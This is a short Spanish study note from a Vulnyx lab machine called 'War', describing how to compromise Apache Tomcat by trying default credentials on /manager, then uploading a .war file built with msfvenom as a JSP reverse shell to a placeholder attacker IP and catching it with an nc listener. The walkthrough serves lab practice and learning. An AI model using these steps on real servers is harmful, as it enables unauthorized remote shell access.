- Tags: #apache_tomcat #java #recursos_vulnyx #hack_trick #msfvenom 

**Recurso**: Maquina War Vulnyx

Apache Tomcat es un servidor para desplegar sitios webs con java

Tener en cuenta cuando estamos frente a un apache tomcat
1- Revisar las credenciales por defecto. Hackricks default passwords
2-Directorio /manager  contiene un formulario de inicio de session

No es recomendable hacer fuerza bruta ya que este servidor tiene protección  contra este tipo de ataque

Teniendo acceso al panel de administración intentamos subir un archivo malicioso .war generado con msfvenom

```bash
msfvvenom -p java/jsp_shell_reverse_tcp LHOST=ip_attacker LPORT=l_port_attacker -f war -o payload.war
```

Lo subimos mediate la pagina /manager del tomcat
![](../../../attachments/Pasted%20image%2020260216110159.png)

Nos ponemos a la escucha ya sea con nc o con meterpreter.
```bash
nc -nlvp port
```

![](../../../attachments/Pasted%20image%2020260216110454.png)